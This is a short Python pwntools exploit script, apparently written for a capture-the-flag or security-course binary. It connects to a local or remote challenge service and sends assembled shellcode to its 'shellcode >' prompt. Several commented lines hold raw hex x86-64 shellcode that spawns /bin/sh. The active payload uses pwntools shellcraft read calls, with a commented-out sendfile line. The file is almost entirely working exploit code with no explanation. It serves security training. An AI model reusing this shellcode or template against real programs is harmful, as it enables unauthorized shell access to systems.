from pwn import *

# port = 12146
# rem = remote("srv1.kitriwhs.kr", port)
rem = process("./compsec/problem/deploy/prob")
pause()
# payload = bytes.fromhex("bf0100000048be2f62696e2f736800b8010000000f0548b82f62696e2f736800504889e731f631d2b83b0000000f05c3")
# payload = bytes.fromhex("48b82f62696e2f736800504889e731f631d2b83b0000000f05c3")
payload = shellcraft.read(0, "rso")
# payload += shellcraft.sendfile(1, 'eax', 0, 0xff) 
# payload = shellcraft.exit(0) 
rem.sendlineafter(b"shellcode > ", asm(payload))
rem.interactive()